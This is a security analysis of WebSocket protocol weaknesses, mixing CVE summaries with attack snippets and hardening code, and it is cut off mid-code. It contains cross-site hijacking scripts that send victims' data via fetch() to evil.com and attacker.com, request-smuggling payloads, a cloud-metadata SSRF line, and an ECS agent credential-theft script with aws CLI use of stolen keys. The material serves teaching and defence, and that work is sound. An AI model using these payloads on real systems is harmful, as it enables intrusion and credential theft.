# WebSocket Protocol Security Analysis: Direct Extraction from RFC Specifications

> **Analysis Target**: RFC 6455 (The WebSocket Protocol), RFC 7692 (WebSocket Compression Extensions)
> **Methodology**: Direct extraction from specification text, cross-referenced with latest CVE data and security research
> **Latest Cases**: CVE-2024-55591, CVE-2025-52882, CVE-2024-26135, CSWSH attacks (2024-2025)
> **Analysis Date**: February 2026

## Executive Summary

The WebSocket protocol (RFC 6455) provides full-duplex communication but relies heavily on correct implementation of spec-mandated requirements. Key security issues:

1. **Origin validation** - SHOULD (not MUST) → CSWSH attacks
2. **Frame masking** - Infrastructure protection requirement
3. **Compression side-channels** - CRIME/BREACH attacks
4. **No standard authentication** - Implementation vulnerabilities
5. **DoS via resource exhaustion** - Stateful connection management

---

## Part I: Protocol Architecture

### 1. Origin-Based Security Model (RFC 6455 §10.2)

**Spec**: *"Servers...SHOULD verify the |Origin| field"* (SHOULD, not MUST)

**Security Implication**: Optional origin validation → Cross-Site WebSocket Hijacking (CSWSH)

**Attack Vector**:
```html
<script>
var ws = new WebSocket("wss://victim.com/chat");
ws.onopen = function() {
    ws.send(JSON.stringify({action: "transfer_funds", amount: 10000}));
};
</script>
```

**Real-World CVEs**:
- CVE-2024-26135 (MeshCentral): CSWSH via missing Origin validation
- CVE-2025-52882 (Claude Code CVSS 8.8): Localhost WebSocket bypass

**Defense**:
```python
ALLOWED_ORIGINS = ['https://app.example.com']
if request.headers.get('Origin') not in ALLOWED_ORIGINS:
    return 403
```

### 2. Frame Masking (RFC 6455 §10.3)

**Spec**: *"A client MUST mask all frames"*

**Purpose**: Prevent cache poisoning and proxy command injection

**Defense**:
```python
if frame.from_client and not frame.is_masked:
    send_close_frame(1002)  # Protocol error
```

### 3. Handshake Authentication (RFC 6455 §4.2.2)

**Spec**: SHA-1 hash of `Sec-WebSocket-Key` + GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`

**Defense**:
```python
WEBSOCKET_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
accept_key = base64.b64encode(
    hashlib.sha1((client_key + WEBSOCKET_GUID).encode()).digest()
)
```

---

## Part II: Data Framing Vulnerabilities

### 4. UTF-8 Validation (RFC 6455 §8.1)

**Spec**: *"MUST fail the WebSocket connection"* on invalid UTF-8

**Attack**: Overlong UTF-8 encoding to bypass filters

**Defense**:
```python
frame.payload.decode('utf-8', errors='strict')  # Raises on invalid UTF-8
```

### 5. Fragmentation DoS (RFC 6455 §5.4)

**Issue**: No spec limits on fragments

**Attack**: Slowloris-style incomplete fragmented messages

**Defense**:
```python
MAX_FRAGMENTS = 1000
MAX_MESSAGE_SIZE = 1 * 1024 * 1024
FRAGMENT_TIMEOUT = 30  # seconds
```

### 6. Payload Length Overflow (RFC 6455 §5.2)

**Issue**: Allows up to 2^63-1 bytes

**CVEs**:
- CVE-2020-36406: uWebSockets buffer overflow
- CVE-2020-27813: Gorilla WebSocket integer overflow

**Defense**:
```python
MAX_PAYLOAD = 10 * 1024 * 1024
if length > MAX_PAYLOAD:
    send_close_frame(1009)  # Message too big
```

---

## Part III: Extensions & Subprotocols

### 7. Compression (RFC 7692)

**Spec Warning**: *"Known exploit when history-based compression is combined with secure transport"*

**Attack**: CRIME/BREACH side-channel

**CVEs**:
- TINKERPOP-2700: WebSocket compression → CRIME/BREACH
- ASP.NET Core #53640: Blazor security warning

**Defense**:
```python
# Never compress sensitive data
if sensitive:
    frame = Frame(rsv1=0, payload=data)  # No compression
```

### 8. Subprotocol Authentication (RFC 6455 §1.9)

**Anti-pattern**: Tokens in `Sec-WebSocket-Protocol` header (logged!)

**Defense**: Post-handshake authentication
```python
auth_msg = await ws.recv(timeout=5)
if not validate_token(auth_msg['token']):
    await ws.close(1008)
```

### 9. GraphQL over WebSocket Security

**Overview**: GraphQL subscriptions commonly use WebSocket transport (graphql-ws, graphql-transport-ws protocols). This introduces unique attack surface combining WebSocket and GraphQL vulnerabilities.

**Key Vulnerabilities**:

#### CVE-2023-38503: Directus Permission Bypass
- **CVSS**: 6.5 Medium
- **Issue**: GraphQL subscriptions bypassed permission system
- **Attack**: Subscribe to unauthorized data streams
- **Affected**: Directus 10.3.0 - 10.4.x (fixed in 10.5.0)

```javascript
// Attacker subscribes to admin-only data
subscription {
  users(filter: {role: {_eq: "admin"}}) {
    id, email, password_hash
  }
}
```

#### CVE-2025-27407: graphql-ruby RCE
- **CVSS**: 9.9 Critical
- **Issue**: Unsafe deserialization in subscription resolver
- **Attack**: Execute arbitrary code via crafted subscription payload
- **Affected**: graphql-ruby <2.4.7

**Real Attack (2025)**: Cross-Site GraphQL Subscription Hijacking
```html
<!-- Attacker's page -->
<script>
import { createClient } from 'graphql-ws';

const client = createClient({
  url: 'wss://victim.com/graphql',
  // Victim's cookies sent automatically
});

client.subscribe({
  query: `
    mutation {
      deleteAccount(id: "victim_id")
    }
  `
}, {
  next: (data) => {
    // Account deleted via CSWSH
    fetch('https://attacker.com/log', {method: 'POST', body: JSON.stringify(data)});
  }
});
</script>
```

**Defense**:
```typescript
// 1. Validate Origin header
const allowedOrigins = ['https://app.example.com'];
if (!allowedOrigins.includes(req.headers.origin)) {
  ws.close(1008, 'Unauthorized origin');
  return;
}

// 2. Require authentication token in connection_init
ws.on('message', (msg) => {
  const { type, payload } = JSON.parse(msg);
  if (type === 'connection_init') {
    if (!validateToken(payload.authToken)) {
      ws.close(1008, 'Invalid authentication');
    }
  }
});

// 3. Enforce permissions per subscription
const schema = makeExecutableSchema({
  resolvers: {
    Subscription: {
      sensitiveData: {
        subscribe: withFilter(
          () => pubsub.asyncIterator('SENSITIVE_DATA'),
          (payload, args, context) => {
            return context.user.role === 'admin';
          }
        )
      }
    }
  }
});
```

---

## Part IV: Latest CVE Analysis (2024-2025)

### CVE-2024-55591/CVE-2025-24472: FortiOS Auth Bypass
- **CVSS**: 9.6 Critical
- **Status**: Exploited in the wild
- **Issue**: Authentication bypass via WebSocket handshake
- **Affected**: FortiOS 7.0.0 - 7.0.16, 7.2.0 - 7.2.10, 7.4.0 - 7.4.5
- **Impact**: Complete device takeover

### CVE-2025-52882: Claude Code CSWSH
- **CVSS**: 8.8 High
- **Attack**: Malicious website → localhost WebSocket → file read + code execution
- **Fix**: Origin validation for localhost connections

### CVE-2024-26135: MeshCentral CSWSH
- **Issue**: No Origin validation + cookie auth + no CSRF token
- **Fix**: Validate Origin against allowlist

### CVE-2024-21733: Apache Tomcat WebSocket Smuggling
- **CVSS**: 7.5 High
- **Affected**: Apache Tomcat 8.5.7 - 8.5.63, 9.0.0-M11 - 9.0.43
- **Issue**: Incorrect HTTP/1.1 upgrade handling allows HTTP request smuggling via WebSocket upgrade
- **Attack Mechanism**:
```http
POST /api/admin HTTP/1.1
Host: backend.internal
Content-Length: 100
Upgrade: websocket
Connection: upgrade

GET /admin/delete_all HTTP/1.1
Host: backend.internal
```
**Impact**: Bypass security controls, access restricted endpoints
- **Fix**: Upgrade to patched versions (Tomcat 8.5.64+, 9.0.44+)

### CVE-2024-38355: Socket.IO Denial of Service
- **CVSS**: 7.3 High
- **Affected**: Socket.IO <2.5.0, >=3.0.0 <4.6.2
- **Issue**: Unhandled exception in WebSocket transport causes server crash
- **Attack**:
```javascript
// Send malformed packet
socket.emit('\u0000invalid', {type: 99, data: null});
```
- **Impact**: Complete service disruption
- **Fix**: Socket.IO 4.6.2+

### CVE-2024-21386: SignalR .NET Denial of Service
- **CVSS**: 7.5 High
- **Affected**: .NET 6.0, 7.0, 8.0
- **Issue**: WebSocket frame processing DoS via crafted frames
- **Attack**: Send rapid sequence of invalid continuation frames
- **Fix**: Install .NET security updates (January 2024)

### CVE-2025-10148: curl WebSocket Predictable Mask
- **CVSS**: 5.3 Medium
- **Affected**: curl 7.86.0 - 8.15.0
- **Issue**: WebSocket mask pattern not updated per frame, uses fixed mask throughout connection
- **Attack**: Cache poisoning via predictable XOR masks when proxy confuses WebSocket for HTTP traffic
- **Requirements**: Clear text ws:// (not wss://), vulnerable proxy that misinterprets traffic
```python
# Attacker with predictable mask knowledge can craft payload
# to poison proxy cache when traffic misinterpreted as HTTP
malicious_frame = xor(cache_poison_payload, fixed_mask)
```
- **Impact**: Cache poisoning, potential credential theft (requires specific proxy misconfiguration)
- **Fix**: curl 8.16.0+ (updates mask pattern for each frame per RFC 6455)

### CVE-2024-41570: Havoc C2 SSRF via WebSocket
- **CVSS**: 9.8 Critical
- **Affected**: Havoc C2 Framework 0.7
- **Issue**: Unauthenticated SSRF in demon callback handling allows arbitrary network requests
- **Attack**:
```python
# Attacker spoofs demon agent registration via WebSocket
# Opens TCP socket on teamserver to read/write arbitrary data
# Can access cloud metadata services, internal APIs
ws.connect('wss://teamserver/demon')
ws.send(spoofed_registration)
ws.send('GET http://169.254.169.254/latest/meta-data/')
```
- **Impact**: SSRF to internal network, cloud metadata access, credential theft, origin IP disclosure
- **Fix**: Havoc 0.8+ (authentication required for demon callbacks)

### CVE-2024-37890: ws npm Package DoS
- **CVSS**: 7.5 High
- **Affected**: ws <8.17.1
- **Issue**: No limit on HTTP header count during upgrade
- **Attack**:
```http
GET / HTTP/1.1
Upgrade: websocket
Connection: upgrade
X-Header-1: value
X-Header-2: value
... (repeat 100,000 times) ...
```
- **Impact**: Memory exhaustion, server crash
- **Fix**: ws 8.17.1+ limits headers to 100

### CVE-2025-66902: websocket-server Input Validation
- **CVSS**: 6.5 Medium
- **Affected**: websocket-server (Go) <1.3.0
- **Issue**: No UTF-8 validation on text frames (violates RFC 6455 §8.1)
- **Attack**: Send overlong UTF-8 sequences to bypass content filters
```python
# Bypass "script" filter with overlong encoding
payload = b'\xc0\xbc\x73\x63\x72\x69\x70\x74'  # Overlong "script"
```
- **Fix**: websocket-server 1.3.0+ enforces strict UTF-8

### CVE-2024-28179: jupyter-server-proxy WebSocket Authentication Bypass
- **CVSS**: 8.1 High
- **Affected**: jupyter-server-proxy <3.2.3, <4.1.1
- **Issue**: WebSocket proxying does not validate user authentication
- **Attack**: Connect to proxied WebSocket endpoints (RStudio, VNC, etc.) without authentication
- **Impact**: Unauthenticated remote code execution via proxied applications
- **Fix**: jupyter-server-proxy 3.2.3+ or 4.1.1+

### CVE-2025-41254: Spring Framework CSRF Bypass
- **CVSS**: 7.4 High
- **Affected**: Spring Framework 5.3.0 - 5.3.32, 6.0.0 - 6.0.17, 6.1.0 - 6.1.4
- **Issue**: CSRF protection not enforced on WebSocket STOMP endpoints
- **Attack**:
```html
<script>
const socket = new WebSocket('wss://victim.com/ws');
socket.onopen = () => {
  // No CSRF token required
  socket.send('SEND\ndestination:/app/admin/delete\n\n{"user":"victim"}\0');
};
</script>
```
- **Impact**: Perform unauthorized actions via CSWSH
- **Fix**: Spring Framework 5.3.33+, 6.0.18+, 6.1.5+ (enforce CSRF tokens)

### CVE-2020-8823: SockJS Reflected XSS
- **CVSS**: 6.1 Medium
- **Affected**: SockJS <0.3.20
- **Issue**: Reflected XSS in WebSocket fallback endpoint
- **Attack**: `GET /sockjs/info?callback=<script>alert(1)</script>`
- **Note**: SockJS deprecated; migrate to native WebSocket or Socket.IO
- **Fix**: SockJS 0.3.20+ (sanitizes callback parameter)

---

## Part V: WebSocket Libraries Security

### Socket.IO (Node.js)

**Overview**: Most popular WebSocket library for Node.js with 60M+ downloads/month

**Key CVEs**:
- CVE-2024-38355: DoS via unhandled exception
- CVE-2022-2421: CORS bypass in Socket.IO 2.x

**Secure Configuration**:
```javascript
const io = require('socket.io')(server, {
  cors: {
    origin: "https://app.example.com",
    methods: ["GET", "POST"],
    credentials: true
  },
  maxHttpBufferSize: 1e6,  // 1MB
  pingTimeout: 60000,
  pingInterval: 25000,
  connectTimeout: 45000,
  allowEIO3: false  // Disable legacy protocol
});

io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!validateToken(token)) {
    return next(new Error('Authentication failed'));
  }
  next();
});

io.on('connection', (socket) => {
  // Rate limiting
  const limiter = new Map();
  socket.on('message', (data) => {
    const now = Date.now();
    const count = limiter.get(socket.id) || {count: 0, reset: now + 1000};
    if (now > count.reset) {
      limiter.set(socket.id, {count: 1, reset: now + 1000});
    } else if (count.count >= 10) {
      socket.disconnect(true);
      return;
    } else {
      count.count++;
    }
    // Process message
  });
});
```

### SignalR (.NET)

**Overview**: Microsoft's real-time framework for ASP.NET

**Key CVEs**:
- CVE-2024-21386: DoS via crafted frames
- CVE-2025-41254: CSRF bypass

**Secure Configuration**:
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddSignalR(options =>
    {
        options.EnableDetailedErrors = false;
        options.MaximumReceiveMessageSize = 1024 * 1024; // 1MB
        options.HandshakeTimeout = TimeSpan.FromSeconds(15);
        options.KeepAliveInterval = TimeSpan.FromSeconds(15);
        options.ClientTimeoutInterval = TimeSpan.FromSeconds(30);
    });

    services.AddCors(options =>
    {
        options.AddPolicy("SignalRPolicy", builder =>
        {
            builder.WithOrigins("https://app.example.com")
                   .AllowCredentials()
                   .AllowAnyMethod()
                   .AllowAnyHeader();
        });
    });
}

public void Configure(IApplicationBuilder app)
{
    app.UseCors("SignalRPolicy");

    app.UseEndpoints(endpoints =>
    {
        endpoints.MapHub<ChatHub>("/chat", options =>
        {
            options.Transports = HttpTransportType.WebSockets;
        });
    });
}

// Hub with authentication
[Authorize]
public class ChatHub : Hub
{
    public override async Task OnConnectedAsync()
    {
        var userId = Context.User?.Identity?.Name;
        if (string.IsNullOrEmpty(userId))
        {
            Context.Abort();
            return;
        }
        await base.OnConnectedAsync();
    }
}
```

### ws (npm)

**Overview**: Fast, RFC-compliant WebSocket client/server for Node.js

**Key CVEs**:
- CVE-2024-37890: DoS via header count
- CVE-2021-32640: ReDoS in Sec-WebSocket-Protocol parsing

**Secure Configuration**:
```javascript
const WebSocket = require('ws');

const wss = new WebSocket.Server({
  port: 8080,
  perMessageDeflate: false,  // Disable compression for secrets
  clientTracking: true,
  maxPayload: 1024 * 1024,  // 1MB
  verifyClient: (info, callback) => {
    const origin = info.origin;
    const allowedOrigins = ['https://app.example.com'];

    if (!allowedOrigins.includes(origin)) {
      callback(false, 403, 'Forbidden');
      return;
    }

    // Validate token from query or header
    const token = new URL(info.req.url, 'ws://localhost').searchParams.get('token');
    if (!validateToken(token)) {
      callback(false, 401, 'Unauthorized');
      return;
    }

    callback(true);
  }
});

wss.on('connection', (ws, req) => {
  // Set up heartbeat
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });

  // Message validation
  ws.on('message', (data, isBinary) => {
    if (data.length > 100000) {
      ws.close(1009, 'Message too big');
      return;
    }

    if (!isBinary) {
      try {
        const msg = JSON.parse(data);
        // Process message
      } catch (e) {
        ws.close(1007, 'Invalid JSON');
      }
    }
  });
});

// Heartbeat interval
const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      return ws.terminate();
    }
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);
```

### websockets (Python)

**Overview**: Popular async WebSocket library for Python

**Best Practices**:
```python
import asyncio
import websockets
from websockets.exceptions import ConnectionClosedError

ALLOWED_ORIGINS = ['https://app.example.com']
MAX_SIZE = 1024 * 1024  # 1MB
MAX_QUEUE = 10

async def handler(websocket, path):
    # Validate origin
    origin = websocket.request_headers.get('Origin')
    if origin not in ALLOWED_ORIGINS:
        await websocket.close(1008, 'Unauthorized origin')
        return

    # Post-handshake authentication
    try:
        auth_msg = await asyncio.wait_for(
            websocket.recv(),
            timeout=5.0
        )
        if not validate_token(auth_msg):
            await websocket.close(1008, 'Invalid token')
            return
    except asyncio.TimeoutError:
        await websocket.close(1008, 'Auth timeout')
        return

    # Message loop
    try:
        async for message in websocket:
            # Rate limiting (example)
            if not rate_limiter.check(websocket.remote_address):
                await websocket.close(1008, 'Rate limit exceeded')
                break

            # Process message
            await process_message(websocket, message)
    except ConnectionClosedError:
        pass

async def main():
    async with websockets.serve(
        handler,
        'localhost',
        8765,
        max_size=MAX_SIZE,
        max_queue=MAX_QUEUE,
        compression=None,  # Disable compression
        ping_interval=20,
        ping_timeout=30,
        close_timeout=10
    ):
        await asyncio.Future()

asyncio.run(main())
```

### gorilla/websocket (Go)

**Overview**: Production-grade WebSocket library for Go

**Key CVEs**:
- CVE-2020-27813: Integer overflow in length calculation

**Secure Configuration**:
```go
package main

import (
    "net/http"
    "time"
    "github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
    ReadBufferSize:  1024,
    WriteBufferSize: 1024,
    CheckOrigin: func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        allowedOrigins := []string{"https://app.example.com"}
        for _, allowed := range allowedOrigins {
            if origin == allowed {
                return true
            }
        }
        return false
    },
    EnableCompression: false,
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        return
    }
    defer conn.Close()

    // Set limits
    conn.SetReadLimit(1024 * 1024) // 1MB
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))
    conn.SetPongHandler(func(string) error {
        conn.SetReadDeadline(time.Now().Add(60 * time.Second))
        return nil
    })

    // Heartbeat
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()

    go func() {
        for range ticker.C {
            if err := conn.WriteControl(
                websocket.PingMessage,
                []byte{},
                time.Now().Add(10*time.Second),
            ); err != nil {
                return
            }
        }
    }()

    // Message loop
    for {
        messageType, message, err := conn.ReadMessage()
        if err != nil {
            break
        }

        if messageType != websocket.TextMessage {
            conn.Close()
            break
        }

        // Process message
        if err := processMessage(conn, message); err != nil {
            break
        }

        conn.SetReadDeadline(time.Now().Add(60 * time.Second))
    }
}
```

### SockJS (Deprecated)

**Status**: No longer actively maintained

**Key CVEs**:
- CVE-2020-8823: Reflected XSS

**Migration Recommendation**:
```
SockJS → Socket.IO 4.x or native WebSocket

Reasons:
- No security updates since 2020
- Native WebSocket support in all modern browsers
- Better performance without HTTP fallbacks
- Active maintenance in alternatives
```

---

## Part VI: Advanced Attack Techniques

### 6.1: WebSocket Smuggling (CVE-2024-21733 Deep Dive)

**Attack Context**: HTTP/1.1 proxies and backend servers may disagree on WebSocket upgrade handling, allowing HTTP request smuggling.

**Vulnerable Architecture**:
```
Client → Proxy (Apache/Nginx) → Backend (Tomcat)
         [Allows upgrade]         [Processes as HTTP]
```

**Attack Payload**:
```http
POST /public HTTP/1.1
Host: victim.com
Content-Length: 150
Upgrade: websocket
Connection: upgrade, close
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==

GET /admin/delete_user?id=victim HTTP/1.1
Host: victim.com
X-Forwarded-For: 127.0.0.1
Cookie: admin_session=hijacked_token

```

**What Happens**:
1. Proxy sees "Upgrade: websocket" → forwards to backend
2. Backend rejects upgrade (not WebSocket endpoint)
3. Backend processes Content-Length: 150
4. Backend interprets smuggled GET request as separate admin request
5. Smuggled request executed with elevated privileges

**Real-World Impact**:
- Bypass authentication on admin endpoints
- Access internal APIs
- Cache poisoning
- Session hijacking

**Detection**:
```python
# Server-side detection
def validate_upgrade(request):
    if 'upgrade' in request.headers.get('Connection', '').lower():
        # Must be valid WebSocket endpoint
        if request.path not in WEBSOCKET_ENDPOINTS:
            log_security_event('Smuggling attempt detected')
            return 400, 'Invalid upgrade request'

        # Reject if Content-Length present
        if 'Content-Length' in request.headers:
            return 400, 'Content-Length forbidden in upgrade'

        # Validate all required headers
        required = ['Upgrade', 'Sec-WebSocket-Version', 'Sec-WebSocket-Key']
        if not all(h in request.headers for h in required):
            return 400, 'Invalid WebSocket handshake'

    return None  # OK
```

**Defense Layers**:
1. Upgrade to patched Tomcat versions
2. Proxy configuration to drop invalid upgrades
3. WAF rules to detect smuggling patterns
4. Disable HTTP/1.1 pipelining

### 6.2: GraphQL over WebSocket CSWSH

**Attack Chain** (Real 2025 Incident):

**Step 1**: Victim visits attacker's website
```html
<!-- https://evil.com/exploit.html -->
<script>
import { createClient } from 'graphql-ws';

const client = createClient({
  url: 'wss://socialapp.com/graphql',
  // Victim's cookies automatically sent (same-site lax)
});
</script>
```

**Step 2**: Subscribe to sensitive data
```javascript
client.subscribe({
  query: `
    subscription {
      privateMessages {
        id, sender, content
      }
    }
  `
}, {
  next: (data) => {
    // Exfiltrate messages
    fetch('https://evil.com/log', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
});
```

**Step 3**: Execute destructive mutation
```javascript
client.subscribe({
  query: `
    mutation {
      deleteAccount {
        success
      }
    }
  `
}, {
  next: () => {
    alert('Account deleted!');
  }
});
```

**Why It Worked**:
1. No Origin validation on WebSocket endpoint
2. GraphQL mutations allowed via subscription protocol
3. Cookie-based authentication (no CSRF token)
4. SameSite=Lax cookies sent on WebSocket upgrade

**Complete Defense**:
```typescript
// 1. Origin validation (critical)
const ALLOWED_ORIGINS = ['https://socialapp.com'];

wss.on('upgrade', (request, socket, head) => {
  const origin = request.headers.origin;
  if (!ALLOWED_ORIGINS.includes(origin)) {
    socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
    socket.destroy();
    return;
  }
});

// 2. Token-based auth (not cookies)
const client = createClient({
  url: 'wss://socialapp.com/graphql',
  connectionParams: async () => {
    return {
      authToken: await getTokenFromStorage()  // Not from cookies
    };
  }
});

// 3. Server validates token
wss.on('connection', (socket, request) => {
  socket.on('message', (data) => {
    const msg = JSON.parse(data);
    if (msg.type === 'connection_init') {
      const token = msg.payload?.authToken;
      if (!validateJWT(token)) {
        socket.close(4401, 'Unauthorized');
      }
    }
  });
});

// 4. Disable mutations over subscriptions
const schema = makeExecutableSchema({
  typeDefs,
  resolvers: {
    Mutation: {
      deleteAccount: (parent, args, context) => {
        // Only allow via HTTP POST, not WebSocket
        if (context.protocol === 'websocket') {
          throw new Error('Mutations not allowed via WebSocket');
        }
      }
    }
  }
});
```

### 6.3: Cache Poisoning via Predictable Masks

**Background**: RFC 6455 requires client frames to be XOR-masked with 32-bit random key. Weak RNG enables cache poisoning.

**CVE-2025-10148 (curl) Analysis**:

**Vulnerable Behavior**:
```c
// curl 8.15.0 and earlier
// Mask pattern persisted throughout entire connection
// instead of updating for each frame
```

**Attack Scenario**:
```python
# When proxy misconfigures WebSocket as HTTP traffic
# Fixed mask allows attacker to craft specific payloads

# Known fixed mask for connection
fixed_mask = 0x12345678

# Craft cache-poisoning payload
target_url = "GET /evil.js HTTP/1.1\r\nHost: victim.com\r\n\r\n"
malicious_frame = xor_bytes(target_url.encode(), fixed_mask)

# If proxy misinterprets as HTTP, cache gets poisoned
send_websocket_frame(malicious_frame)
```

**Attack Impact**:
1. Proxy caches malicious JavaScript as legitimate response
2. All users receive XSS payload
3. Credential theft, session hijacking

**Defense**:
```c
// Fixed in curl 8.16.0+
// Mask updated for each frame per RFC 6455 specification
uint32_t mask = generate_new_mask_per_frame();
```

**Server-Side Detection**:
```python
# Monitor for suspicious mask patterns
mask_history = {}

def check_mask_entropy(client_ip, mask):
    if client_ip not in mask_history:
        mask_history[client_ip] = []

    mask_history[client_ip].append(mask)

    # Check for low entropy (< 20 bits)
    if len(mask_history[client_ip]) >= 10:
        masks = mask_history[client_ip][-10:]
        entropy = calculate_entropy(masks)
        if entropy < 20:
            log_alert(f'Weak mask from {client_ip}')
            return False

    return True
```

### 6.4: ECS Agent Credential Theft (Black Hat 2025)

**Attack Context**: AWS ECS tasks communicate via WebSocket to ECS agent. Compromising WebSocket allows IAM credential theft.

**Attack Vector**:
```
Attacker controls ECS task → WebSocket to ECS agent → Steal credentials for other tasks
```

**Exploitation Steps**:

**Step 1**: Deploy malicious container
```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3 python3-pip
RUN pip3 install websocket-client

COPY exploit.py /
CMD ["python3", "/exploit.py"]
```

**Step 2**: Connect to ECS agent WebSocket
```python
# exploit.py
import websocket
import json

# ECS agent listens on localhost:51679
ws = websocket.WebSocket()
ws.connect("ws://169.254.170.2:51679/v1/tasks")

# Request credentials for another task
payload = {
    "type": "CredentialsFetchMessage",
    "taskArn": "arn:aws:ecs:us-east-1:123456789:task/victim-task-id"
}
ws.send(json.dumps(payload))

response = ws.recv()
creds = json.loads(response)

# Exfiltrate IAM credentials
print(f"AccessKeyId: {creds['AccessKeyId']}")
print(f"SecretAccessKey: {creds['SecretAccessKey']}")
print(f"Token: {creds['Token']}")
```

**Step 3**: Use stolen credentials
```bash
export AWS_ACCESS_KEY_ID=<stolen>
export AWS_SECRET_ACCESS_KEY=<stolen>
export AWS_SESSION_TOKEN=<stolen>

# Access S3, DynamoDB, etc. with victim's permissions
aws s3 ls
aws dynamodb scan --table-name sensitive-data
```

**Defense** (AWS Security Best Practices):
```json
// 1. ECS Task IAM Role isolation
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Action": "sts:AssumeRole",
    "Resource": "*",
    "Condition": {
      "StringNotEquals": {
        "aws:PrincipalArn": "arn:aws:iam::123456789:role/MyTaskRole"
      }
    }
  }]
}

// 2. Network isolation
{
  "requiresCompatibilities": ["FARGATE"],
  "networkMode": "awsvpc",
  "containerDefinitions": [{
    "name": "app",
    "image": "myapp:latest",
    // Disable ECS agent access
    "environment": [{
      "name": "ECS_ENABLE_TASK_IAM_ROLE",
      "value": "false"
    }]
  }]
}
```

```yaml
# 3. Kubernetes Network Policy (EKS)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-ecs-agent
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.170.2/32  # Block ECS agent
```

---

## Part VII: Modern Security Practices (2024-2025)

### 7.1: Rate Limiting & DoS Prevention

**Heartbeat Configuration** (RFC 6455 §5.5.2):

```javascript
// Recommended: 20-30 second interval
const PING_INTERVAL = 25000;  // 25s
const PONG_TIMEOUT = 30000;   // 30s

function setupHeartbeat(ws) {
  let isAlive = true;

  ws.on('pong', () => {
    isAlive = true;
  });

  const interval = setInterval(() => {
    if (!isAlive) {
      clearInterval(interval);
      ws.terminate();
      return;
    }

    isAlive = false;
    ws.ping();
  }, PING_INTERVAL);

  ws.on('close', () => clearInterval(interval));
}
```

**Token Bucket Rate Limiting**:
```python
import time
from collections import defaultdict

class TokenBucket:
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity
        self.refill_rate = refill_rate
        self.buckets = defaultdict(lambda: {
            'tokens': capacity,
            'last_refill': time.time()
        })

    def consume(self, client_id, tokens=1):
        bucket = self.buckets[client_id]
        now = time.time()

        # Refill tokens
        elapsed = now - bucket['last_refill']
        bucket['tokens'] = min(
            self.capacity,
            bucket['tokens'] + elapsed * self.refill_rate
        )
        bucket['last_refill'] = now

        # Check capacity
        if bucket['tokens'] >= tokens:
            bucket['tokens'] -= tokens
            return True
        return False

# Usage
limiter = TokenBucket(capacity=100, refill_rate=10)  # 10 msg/sec

async def handle_message(websocket, message):
    client_id = websocket.remote_address

    if not limiter.consume(client_id):
        await websocket.close(1008, 'Rate limit exceeded')
        return

    # Process message
    await process(message)
```

**Connection Limits**:
```go
package main

import (
    "net/http"
    "sync"
)

type ConnectionLimiter struct {
    mu sync.Mutex
    connections map[string]int
    maxPerIP int
}

func NewConnectionLimiter(maxPerIP int) *ConnectionLimiter {
    return &ConnectionLimiter{
        connections: make(map[string]int),
        maxPerIP: maxPerIP,
    }
}

func (cl *ConnectionLimiter) Allow(ip string) bool {
    cl.mu.Lock()
    defer cl.mu.Unlock()

    if cl.connections[ip] >= cl.maxPerIP {
        return false
    }

    cl.connections[ip]++
    return true
}

func (cl *ConnectionLimiter) Release(ip string) {
    cl.mu.Lock()
    defer cl.mu.Unlock()

    if cl.connections[ip] > 0 {
        cl.connections[ip]--
    }
}

// Usage
var limiter = NewConnectionLimiter(10)  // 10 connections per IP

func wsHandler(w http.ResponseWriter, r *http.Request) {
    ip := r.RemoteAddr

    if !limiter.Allow(ip) {
        http.Error(w, "Too many connections", 429)
        return
    }
    defer limiter.Release(ip)

    // Handle WebSocket
}
```

**Message Rate Limiting**:
```typescript
class MessageRateLimiter {
  private windows: Map<string, number[]> = new Map();

  constructor(
    private maxMessages: number,
    private windowMs: number
  ) {}

  check(clientId: string): boolean {
    const now = Date.now();
    const window = this.windows.get(clientId) || [];

    // Remove expired timestamps
    const validTimestamps = window.filter(ts => now - ts < this.windowMs);

    if (validTimestamps.length >= this.maxMessages) {
      return false;
    }

    validTimestamps.push(now);
    this.windows.set(clientId, validTimestamps);
    return true;
  }
}

// Usage: 100 messages per 10 seconds
const limiter = new MessageRateLimiter(100, 10000);

ws.on('message', (data) => {
  if (!limiter.check(socket.id)) {
    ws.close(1008, 'Too many messages');
    return;
  }
  // Process message
});
```

### 7.2: Cloud Environment Security

**AWS API Gateway WebSocket**:
```yaml
# serverless.yml
service: secure-websocket

provider:
  name: aws
  runtime: nodejs18.x
  websocketApiRouteSelectionExpression: $request.body.action

functions:
  connect:
    handler: handlers.connect
    events:
      - websocket:
          route: $connect
          # Require API key
          authorizer:
            name: auth
            identitySource:
              - route.request.querystring.token

  auth:
    handler: handlers.authorize

resources:
  Resources:
    WebsocketApi:
      Type: AWS::ApiGatewayV2::Api
      Properties:
        Name: SecureWebSocketAPI
        ProtocolType: WEBSOCKET
        RouteSelectionExpression: $request.body.action

    # Throttling
    WebsocketStage:
      Type: AWS::ApiGatewayV2::Stage
      Properties:
        ApiId: !Ref WebsocketApi
        StageName: prod
        DefaultRouteSettings:
          ThrottlingBurstLimit: 100
          ThrottlingRateLimit: 50
```

```javascript
// handlers.js
exports.authorize = async (event) => {
  const token = event.queryStringParameters?.token;

  if (!validateJWT(token)) {
    throw new Error('Unauthorized');
  }

  return {
    principalId: getUserId(token),
    policyDocument: {
